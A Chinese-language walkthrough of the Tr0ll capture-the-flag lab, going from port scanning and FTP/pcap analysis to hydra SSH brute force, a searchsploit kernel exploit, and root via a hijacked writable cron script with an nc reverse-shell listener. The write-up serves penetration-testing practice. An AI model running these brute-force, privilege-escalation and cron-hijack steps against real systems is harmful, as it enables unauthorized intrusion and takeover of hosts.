# **前言**  

本次采用Tr0ll经典项目作为靶场，模拟互联网环境，**演示从信息收集到最后提权的全过程。**本次实验所涉及到的技术有端口扫描、流量分析、文件分析、hydra爆破、各种反弹shell、稳定shell、计划任务反弹shell(提权)，公私钥互碰等一系列基本操作，**适合入门不久的初学者练习。**

攻击机：192.168.160.3

受害机：192.168.160.7

# 一、信息收集

### **1、全端口扫描**

```

nmap -p- 192.168.160.7
```

发现开放21、22、80端口

![](../Images/8f6da7e1740fb4a7872a4f7ca11d55ab.png)

### **2、nmap详细扫描**  

```

nmap -sS -sV -A -T5 192.168.160.7
```

发现ftp存在默认密码Anonymous

![](../Images/645d007bc0792557a1d8645b1b34ac35.png)

### **3、登入ftp**  

使用默认账号密码Anonymous/Anonymous登入ftp

```





ftp 192.168.160.7
```

发现存在lol.pcap流量包

![](../Images/06ec9072a063cbbfe2213116795c5c36.png)

### **4、分析流量包**  

使用wireshark 分析流量

```

wireshark lol.pcap
```

右键追踪tcp流

得到信息secret\_stuff.txt

![](../Images/4562a0a53835cf605777300977d6c27e.png)

![](../Images/ffc116c8ff645e2168ff950cad11fd3b.png)

追踪第二条tcp流，得到信息sup3rs3cr3tdirlol  

![](../Images/9b4b5516981d1316f1f24eaa86d21231.png)

经过排查sup3rs3cr3tdirlol是个目录，里面有个roflmao文件  

![](../Images/7bbbdd8e9115c512253d11a918138c43.png)

### **5、分析文件**  

下载该文件，分析后发现是个32位文件

file roflmao

![](../Images/a74f99fe08b0c31bcd8247ba3b0e9447.png)

分析文件信息  

```
exif

tool roflmao
strings roflmao
```

得到信息：0x0856BF

![](../Images/ac076cec97e106b98576a2e2be3b2f52.png)

发现0x0856BF目录存在信息，将信息做成密码本zhi.txt  

![](../Images/46225248eb21ba808a5eddeb31a5b8e0.png)

Pass.txt里面没啥东西，文件名可能有用  

![](../Images/c126a5ee0ec8b8dd369c2934bf724b32.png)

![](../Images/7b21f82b58168547b1f241827da1615b.png)

# **二、暴力破解**  

### **1、hydra爆破**

使用hydra爆破，将刚才收集的作为账号本，文件名Pass.txt做为密码字段进行ssh爆破

```

hydra -L zhi.txt -p Pass.txt 192.168.160.7 ssh
```

得到账号密码：overflow、Pass.txt

![](../Images/c8182a831079f6cc746d680238af6b6c.png)

### **2、登入ssh**  

```




ssh overflow@192.168.160.7
```

![](../Images/f0658eabe06dbdb4843fbc63f4e452ae.png)

# **三、提权**  

### **1、查看系统版本**

```

uname -a
```

发现是Linux ubuntu 3.13.0

![](../Images/8a8134c5074b92e50e26145e9fcdf72f.png)

### **2、搜索提权exp**  

```




searchsploit Linux ubuntu 3.13.0
```

![](../Images/5d3106084047703e95a74c919a2a19e8.png)

### **3、查看exp**  

```

gedit 37292.c
```

exp里有使用教程

![](../Images/0e55906934cf237d1ca5905f05eaa78d.png)

```


python -m http.server 8520
```

![](../Images/88ca83bf3b57bfb19a8f90ee0bd826a9.png)

```
gcc 37292.c  -o zhi
```

# **四、拓展**

提权后发现shell过几分钟就会断开，应该是设置了计划任务

1、查看计划任务

```


find / -name cronlog 2>/dev/null    ---查看计划任务日志信息
```

发现计划任务设置每5分钟删除tmp目录下文件，并且没有该计划任务的权限

![](../Images/a087e71780967ed8e21c25977d86896e.png)

### **1、反弹shell**  

枚举所有可写入可修改的文件

```


find / -writable 2>/dev/null   ---枚举所有可写入权限的文件
```

![](../Images/923790ebe502f7c60eb7f1a4c8f5f002.png)

修改计划任务文件cleaner.py  

```


nano /lib/log/cleaner.py
```

![](../Images/8f90f6774b3f5e730a8f0e8fe0f0e207.png)

修改为  

```















#!/usr/bin/python
```

```

nc -lvvp 2233
```

成功回弹root权限

![](../Images/62ebb03811fb5bec12dec18d27d58536.png)

### **2、创建root可执行程序**  

修改计划任务

```


os.system('cp /bin/sh /tmp/zhi')
```

![](../Images/841320bd21589e526bd734802c774391.png)

![](../Images/623eefee9e8a0a7876ce3c8cff82ac50.png)

```
ssh-keygen   ---一路空格回车
```
